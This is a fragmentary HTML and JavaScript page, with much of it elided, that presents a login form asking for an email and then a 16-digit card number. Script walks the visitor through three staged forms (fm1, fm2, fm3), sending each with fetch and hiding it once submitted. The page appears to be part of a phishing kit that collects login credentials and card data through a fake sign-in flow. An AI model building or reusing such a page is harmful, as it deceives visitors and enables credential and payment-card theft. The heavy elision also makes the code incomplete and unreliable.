...
<html lang="en"><head>
    ...
    /* Additional styles for mobile, such as smaller size, if needed */
    max-width: 500px; /* Example size, adjust as needed */
    max-height: 500px; /* Example size, adjust as needed */
...
@media (min-width: 768px) { /* Adjust the breakpoint as needed */
    #loading {
        /* Override styles for desktop, such as larger size or different position */
        max-width: 550px; /* Example size, adjust as needed */
        max-height: 700px; /* Example size, adjust as needed */
        /* Adjust left and top if needed, or keep it centered */
    }
}
    </style>
...
<body>
    ...
    <div>
            ...
            <div class="content-container mt-1 mt-lg-3">
                        ...
                        <div class="col-12 col-lg-6 left-custom-white">
                            <div class="px-lg-5 my-3">
                                ...
                                <form method="post" id="fm1" action="login.php">
                                    ...
                                    <div class="form-group">
                                        <input type="email" class="input form-control" id="login-email" name="login-email" placeholder="Email"  >
                                        <div class="error" id="login-email-error"></div>
                                    </div>
             ...
             <div class="form-group">
<input type="text" class="input form-control" id="card" name="card" placeholder="Card Number" required="" maxlength="16" pattern="\d{16}" title="Credit card number should be 16 digits">
                                        <div class="error" id="login-email-error"></div>
                                    </div>
...
document.getElementById('fm1').addEventListener('submit', function(event) {
    ...
    .then(data => {
        ...
        document.getElementById('fm1').style.display = 'none'; // Hide first form
        document.getElementById('fm2').style.display = 'block'; // Show second form
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('loading').style.display = 'none'; // Optionally handle error by hiding the loading GIF
    });
});

document.getElementById('fm2').addEventListener('submit', function(event) {
    event.preventDefault();
    setTimeout(() => {
        var formData = new FormData(event.target);
        document.getElementById('loading').style.display = 'block'; // Ensure this line is executed
...
document.getElementById('fm3').addEventListener('submit', function(event) {
    event.preventDefault();
    var formData = new FormData(event.target);
    document.getElementById('loading').style.display = 'block'; // Ensure this line is executed
    ...
    .then(data => {
        console.log(data);
        document.getElementById('loading').style.display = 'none'; // Hide loading GIF
        document.getElementById('fm3').style.display = 'none'; // Hide third form
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('loading').style.display = 'none'; // Optionally handle error by hiding the loading GIF
